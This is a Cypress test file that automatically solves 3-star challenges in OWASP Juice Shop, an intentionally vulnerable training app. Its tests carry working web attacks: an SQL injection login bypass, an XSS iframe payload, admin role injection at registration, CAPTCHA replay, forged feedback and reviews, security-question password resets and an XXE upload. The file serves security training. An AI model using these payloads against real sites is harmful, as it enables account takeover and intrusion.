import firstVisitPopups from '../POM/FirstVisitPopups.pom';
import registrationPage from '../POM/registrationPage.pom';
import resetPassword from '../POM/resetPassword.pom';
import sideNav from '../POM/sideNav.pom';
import loginPage from '../POM/loginPage.pom';
import complaint from '../POM/complaint.pom';

describe('OWASP JuiceShop Achivments unlocking Automation', () => {
  context('3 - stars vulnerabilities', () => {

    before(() => {
      cy.visit('/');
      firstVisitPopups.closeFirstVisitMesseges();
    });

    beforeEach(() => {
      Cypress.Cookies.preserveOnce('cookieconsent_status', 'welcomebanner_status', 'language');
      cy.visit('/');
    });

    it('1 - Admin Registration', () => {
      const email = registrationPage.userEmail;
      const password = registrationPage.userPassword;
      cy.server();
      cy.request({
        method: 'POST',
        url: '/api/Users/',
        headers: {
          'content-type': 'application/json'
        },
        body: {
          email: email,
          password: password,
          role: 'admin',
        }
      });
      cy.checkIsAchivSolvedXHR('Admin Registration');
    });

    it('2 - Bjoerns Favorite Pet', () => {
      const newPassword = 'newPassword123.';
      const securityAnswer = 'Zaya';
      const emmaEmail = 'bjoern@owasp.org';
      resetPassword.resetPassword(emmaEmail, newPassword, securityAnswer)
      cy.checkIsAchivSolvedXHR('Bjoern\'s Favorite Pet');
    });

    it('3 - CAPTCHA Bypass', () => {
      cy.intercept('captcha/').as('captcha');
      sideNav.navigateToCustomerFeedback();
      cy.wait('@captcha').then((captcha) => {
        for (let i = 0; i < 10; i++) {
          cy.request({
            method: 'POST',
            url: '/api/Feedbacks/',
            body: {
              captchaId: captcha.response.body.captchaId,
              captcha: `${captcha.response.body.answer}`,
              comment: "rte (anonymous)",
              rating: 1
            }
          });
        }
      });
      cy.checkIsAchivSolvedXHR('CAPTCHA Bypass');
    });

    it.skip('4 - Client-side XSS Protection', () => {
      //This challenge is not available on Docker!
      const email = registrationPage.userEmail;
      const password = registrationPage.userPassword;
      cy.server();
      cy.request({
        method: 'POST',
        url: '/api/Users/',
        headers: {
          'content-type': 'application/json'
        },
        body: {
          "email": "<iframe src=\"javascript:alert(`xss`)\">", 
          "password": password, 
          "passwordRepeat": password,
          "securityQuestion": {
            "id": 1,
            "question": "Your eldest siblings middle name?",
            "createdAt": "2021-05-15T07:36:16.600Z",
            "updatedAt": "2020-05-15T07:36:16.600Z"
          },
          "securityAnswer": "1"
        }
      });
      cy.checkIsAchivSolvedXHR('Client-side XSS Protection');
    });

    it('5 - Forged Feedback', () => {
      cy.intercept('captcha/').as('captcha');
      sideNav.navigateToCustomerFeedback();
      cy.wait('@captcha').then((captcha) => {
          cy.request({
            method: 'POST',
            url: '/api/Feedbacks/',
            body: {
              captchaId: captcha.response.body.captchaId,
              captcha: `${captcha.response.body.answer}`,
              comment: "rte (anonymous)",
              rating: 1, 
              UserId: 6,
            }
          });
      });
      cy.checkIsAchivSolvedXHR('Forged Feedback');
    });

    it('6 - Forged Review', () => {
      cy.request({
        method: 'PUT',
        url: '/rest/products/1/reviews',
        body: {
          author: 'bjoern@owasp.org',
          message: 'Forged Review',
        }
      });
      cy.checkIsAchivSolvedXHR('Forged Review');
    });

    it('7 - Login Amy', () => {
      const email = 'amy@juice-sh.op';
      const password = 'K1f.....................';
      loginPage.login(email, password);
      cy.checkIsAchivSolvedXHR('Login Amy');
    });

    it('8 - Privacy Policy Inspection', () => {
      cy.visit('/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility', {failOnStatusCode: false});
      cy.checkIsAchivSolvedXHR('Privacy Policy Inspection');
    });

    it.skip('9 - XXE Data Access', () => {
      //This challenge is not available on Docker!
      const filepath = 'xxe.xml';
      registrationPage.register();
      loginPage.login();
      sideNav.navigateToComplaint();
      complaint.sendComplaint(filepath);
      cy.checkIsAchivSolvedXHR('XXE Data Access');
    });

    it('10 - Login Bender', () => {
      const newPassword = 'newPassword123.';
      const securityAnswer = "Stop'n'Drop";
      const email = 'bender@juice-sh.op';
      resetPassword.resetPassword(email, newPassword, securityAnswer)
      loginPage.login(email, newPassword);
      cy.checkIsAchivSolvedXHR('Login Bender');
    });

    it('11 - Login Jim', () => {
      const newPassword = 'newPassword123.';
      const email = "jim@juice-sh.op'--";
      loginPage.login(email, newPassword);
      cy.checkIsAchivSolvedXHR('Login Jim');
    });

    it('12 - Reset Jims Password', () => {
      const newPassword = 'newPassword123.';
      const securityAnswer = 'Samuel';
      const email = 'jim@juice-sh.op';
      resetPassword.resetPassword(email, newPassword, securityAnswer);
      cy.checkIsAchivSolvedXHR("Reset Jim's Password");
    });
  });
});
